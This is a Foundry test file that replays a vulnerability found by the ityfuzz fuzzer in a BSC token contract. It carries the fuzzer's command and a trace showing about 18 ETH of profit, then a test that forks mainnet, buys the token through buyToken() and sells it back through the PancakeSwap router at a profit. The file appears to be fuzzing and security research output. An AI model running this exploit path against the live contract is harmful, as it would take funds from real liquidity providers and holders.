// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x2C25aEe99ED08A61e7407A5674BC2d1A72B5D8E3,0xB6CF5b77B92a722bF34f6f5D6B1Fe4700908935E,0x6a3Fa7D2C71fd7D44BF3a2890aA257F34083c90f -c bsc --onchain-block-number 27620320 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
Earned 36427024168110298038000000 more than owed 18410433801777329145000000, net earned = 18016590366332968893000000wei (18ETH)

================ Trace ================
[Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb
   ├─[1] 0x2C25aEe99ED08A61e7407A5674BC2d1A72B5D8E3.call{value: 18.4104 Ether}(0xa4821719)
   └─[1] Router.swapExactTokensForETH(100% Balance, 0, path:(0x2C25aEe99ED08A61e7407A5674BC2d1A72B5D8E3 → WETH), address(this), block.timestamp);


 */

contract C2C25 is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 27620320);
    }

    function test() public {
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        vm.deal(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, 18410433801777329145);
        0x2C25aEe99ED08A61e7407A5674BC2d1A72B5D8E3.call{value: 18410433801777329145}(abi.encodeWithSignature(
            "buyToken()"
        )); 
        vm.startPrank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        uint256 amount0 = IERC20(0x2C25aEe99ED08A61e7407A5674BC2d1A72B5D8E3).balanceOf(address(this));
        IERC20(0x2C25aEe99ED08A61e7407A5674BC2d1A72B5D8E3).approve(router, amount0);
        address[] memory liq_path0 = new address[](2);
        liq_path0[0] = 0x2C25aEe99ED08A61e7407A5674BC2d1A72B5D8E3;
        liq_path0[1] = address(weth);
        vm.deal(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, amount0);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount0, 0, liq_path0, address(this), block.timestamp
        );
        vm.stopPrank();
    }

}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
